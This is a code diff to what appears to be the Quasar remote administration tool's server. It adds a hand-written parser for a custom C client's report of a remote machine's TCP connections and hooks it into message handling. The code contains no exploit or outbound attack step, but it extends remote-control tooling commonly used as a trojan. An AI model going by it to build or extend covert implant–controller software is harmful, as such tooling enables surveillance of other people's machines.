@@ -244,6 +244,51 @@ namespace Quasar.Server.Networking
             return true;
         }
 
+        /* Fallback: C client GetConnectionsResponse (subtype 37) = 08 25 [repeated 0A len TcpConnection]. Each TcpConnection: 0x0A ProcessName, 0x12 LocalAddress, 0x18 LocalPort, 0x22 RemoteAddress, 0x28 RemotePort, 0x30 State. */
+        private static bool TryParseRawGetConnectionsResponse(byte[] payload, int start, int length, out GetConnectionsResponse result)
+        {
+            result = null;
+            int end = start + length;
+            if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
+            if (subtype != 37) return false;
+            var connections = new List<TcpConnection>();
+            while (offset + 2 <= end && payload[offset] == 0x0A)
+            {
+                offset++;
+                if (!TryReadVarint(payload, ref offset, end, out int msgLen) || offset + msgLen > end) break;
+                int msgEnd = offset + msgLen;
+                string processName = null, localAddr = null, remoteAddr = null;
+                ushort localPort = 0, remotePort = 0;
+                byte state = 0;
+                while (offset < msgEnd)
+                {
+                    if (!TryReadVarint(payload, ref offset, msgEnd, out int tag)) break;
+                    int field = tag >> 3;
+                    int wire = tag & 7;
+                    if (wire == 0)
+                    {
+                        if (!TryReadVarint(payload, ref offset, msgEnd, out int v)) break;
+                        if (field == 3) localPort = (ushort)v;
+                        else if (field == 5) remotePort = (ushort)v;
+                        else if (field == 6) state = (byte)v;
+                        continue;
+                    }
+                    if (wire != 2) break;
+                    if (!TryReadVarint(payload, ref offset, msgEnd, out int len) || offset + len > msgEnd) break;
+                    string s = Encoding.UTF8.GetString(payload, offset, len);
+                    offset += len;
+                    if (field == 1) processName = s;
+                    else if (field == 2) localAddr = s;
+                    else if (field == 4) remoteAddr = s;
+                }
+                if (processName != null && localAddr != null && remoteAddr != null)
+                    connections.Add(new TcpConnection { ProcessName = processName, LocalAddress = localAddr, LocalPort = localPort, RemoteAddress = remoteAddr, RemotePort = remotePort, State = (ConnectionState)state });
+                offset = msgEnd;
+            }
+            result = new GetConnectionsResponse { Connections = connections.ToArray() };
+            return true;
+        }
+
         /* Fallback: C client GetSystemInfoResponse = 08 3E [repeated 0A len Tuple]. Each Tuple = 0A len item1 12 len item2. */
         private static bool TryParseRawGetSystemInfoResponse(byte[] payload, int start, int length, out GetSystemInfoResponse result)
         {
@@ -983,6 +1028,10 @@ namespace Quasar.Server.Networking
                                         else if (TryParseRawGetDrivesResponse(_payloadBuffer, payloadStart, _payloadLen, out var rawDrives))
                                         {
                                             message = rawDrives;
+                                        }
+                                        else if (TryParseRawGetConnectionsResponse(_payloadBuffer, payloadStart, _payloadLen, out var rawConn))
+                                        {
+                                            message = rawConn;
                                         }
                                         else if (TryParseRawGetSystemInfoResponse(_payloadBuffer, payloadStart, _payloadLen, out var rawSysInfo))
                                         {
